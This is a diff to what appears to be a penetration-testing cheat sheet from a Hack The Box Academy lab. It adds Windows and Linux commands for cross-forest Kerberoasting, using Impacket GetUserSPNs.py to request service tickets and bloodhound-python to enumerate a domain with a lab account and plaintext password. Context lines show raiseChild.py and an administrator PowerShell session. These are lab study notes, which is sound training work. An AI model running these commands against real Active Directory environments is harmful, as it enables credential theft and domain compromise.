@@ -573,6 +573,7 @@ raiseChild.py -target-exec 172.16.5.5 LOGISTICS.INLANEFREIGHT.LOCAL/htb-student_
 ```
 
 ## Cross Forest Kerberoasting
+### Windows
 ```powershell
 import-module .\powerview.ps1
 
@@ -589,4 +590,15 @@ Convert-SidToName S-1-5-21-3842939050-3880317879-2865463114-500
 ```
 ```powershell
 Enter-PSSession -ComputerName ACADEMY-EA-DC03.FREIGHTLOGISTICS.LOCAL -Credential INLANEFREIGHT\administrator
+```
+
+### Linux
+```bash
+# /etc/resolve.conf 수정 필요.
+GetUserSPNs.py -target-domain FREIGHTLOGISTICS.LOCAL INLANEFREIGHT.LOCAL/wley
+
+GetUserSPNs.py -request -target-domain FREIGHTLOGISTICS.LOCAL INLANEFREIGHT.LOCAL/wley
+```
+```bash
+bloodhound-python -d FREIGHTLOGISTICS.LOCAL -dc ACADEMY-EA-DC03.FREIGHTLOGISTICS.LOCAL -c All -u forend@inlanefreight.local -p Klmcargo2
 ```
